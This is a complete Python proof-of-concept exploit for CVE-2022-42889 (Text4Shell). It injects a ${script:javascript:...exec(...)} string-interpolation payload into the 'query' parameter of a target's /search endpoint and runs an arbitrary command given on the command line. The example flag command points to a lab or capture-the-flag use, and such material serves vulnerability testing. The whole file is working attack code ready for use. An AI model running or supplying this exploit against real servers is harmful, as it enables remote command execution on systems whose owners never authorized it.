# CVE-2022-42889 :: Proof of Concept

import requests
import urllib.parse
import argparse

def test_text4shell(target_ip, target_port, command):
    try:
        # Construct the target URL
        target_url = f"http://{target_ip}:{target_port}/search"
        # Construct the Text4Shell payload
        payload = f'${{script:javascript:java.lang.Runtime.getRuntime().exec("{command}")}}'
        payload = urllib.parse.quote(payload)
        url = f"{target_url}?query={payload}"
        
        # Send the request
        response = requests.get(url, timeout=10)
        
        # Print results
        print(f"[+] Target: {target_url}")
        print(f"[+] Command: {command}")
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response: {response.text}")
        try:
            json_response = response.json()
            print(f"[+] JSON Result: {json_response.get('result', 'No result field')}")
        except:
            print("[-] Response is not JSON")
            
    except Exception as e:
        print(f"[-] Error: {str(e)}")

if __name__ == "__main__":
    # Set up argument parser
    parser = argparse.ArgumentParser(description="Text4Shell Exploit PoC")
    parser.add_argument("-i", "--ip", required=True, help="Target IP address (e.g., 192.168.169.150)")
    parser.add_argument("-p", "--port", default="8080", help="Target port (default: 8080)")
    parser.add_argument("-c", "--command", required=True, help="Command to execute (e.g., 'cat /flag.txt')")
    args = parser.parse_args()
    
    # Run the exploit
    test_text4shell(args.ip, args.port, args.command)
